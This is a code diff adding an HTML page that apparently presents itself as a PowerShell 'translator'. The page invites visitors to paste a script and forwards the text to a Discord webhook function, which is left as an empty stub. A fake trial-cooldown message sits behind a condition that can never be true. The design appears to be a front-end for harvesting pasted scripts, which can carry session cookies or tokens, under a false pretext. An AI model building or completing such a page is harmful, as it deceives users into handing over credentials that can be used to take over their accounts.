@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PowerShell Script to Webhook</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <div class="logo-circle"></div>
+      <h2>PowerShell to Webhook</h2>
+    </div>
+    <nav>
+      <a href="#">Home</a>
+    </nav>
+  </header>
+  <main>
+    <h1>Updated Daily</h1>
+    <div id="wordContainer">
+      <p id="word">Fetching word...</p>
+    </div>
+    <div class="form-container">
+      <form id="scriptForm">
+        <label for="powershellScript">The PowerShell Script (Required)</label>
+        <textarea id="powershellScript" placeholder="Paste the PowerShell script here." required></textarea>
+        <p class="error-message" id="errorMessage"></p>
+        <button type="submit">Translate</button>
+      </form>
+    </div>
+    <div id="generatedPasswordContainer">
+      <p id="generatedPassword"></p>
+    </div>
+  </main>
+  <script>
+    // Function to fetch a word from hello.txt
+    async function fetchWord() {
+      try {
+        const response = await fetch('hello.txt'); // Ensure hello.txt is in the same directory as this HTML file
+        if (!response.ok) {
+          throw new Error('Failed to fetch hello.txt');
+        }
+        const text = await response.text();
+        const words = text.split(/\s+/); // Split by whitespace
+        const word = words.length > 0 ? words[0] : 'No words found'; // Get the first word
+        document.getElementById('word').textContent = `Word from hello.txt: ${word}`;
+      } catch (error) {
+        console.error('Error fetching word:', error);
+        document.getElementById('word').textContent = 'Error fetching word.';
+      }
+    }
+
+    // Fetch a word on page load
+    fetchWord();
+
+    document.getElementById('scriptForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const errorMessage = document.getElementById('errorMessage');
+      const lastSubmissionTime = localStorage.getItem('lastSubmissionTime');
+      const currentTime = Date.now();
+
+      // Cooldown logic
+      if (lastSubmissionTime && currentTime - lastSubmissionTime < 0) {
+        const remainingTime = Math.ceil((3600000 - (currentTime - lastSubmissionTime)) / 60000); // Time in minutes
+        errorMessage.textContent = `❌ Trial version ended. Try again in ${remainingTime} minute(s).`;
+        errorMessage.style.display = 'block';
+        return;
+      }
+
+      const powershellScript = document.getElementById('powershellScript').value;
+
+      if (!powershellScript) {
+        errorMessage.textContent = '⚠️ Invalid PowerShell script. Please paste a valid script.';
+        errorMessage.style.display = 'block';
+      } else {
+        errorMessage.style.display = 'none';
+        sendToDiscord(powershellScript);
+
+        // Set cooldown timestamp
+        localStorage.setItem('lastSubmissionTime', currentTime);
+      }
+    });
+
+    function sendToDiscord(script) {
+      // You can include your existing sendToDiscord logic here
+    }
+  </script>
+</body>
+</html>
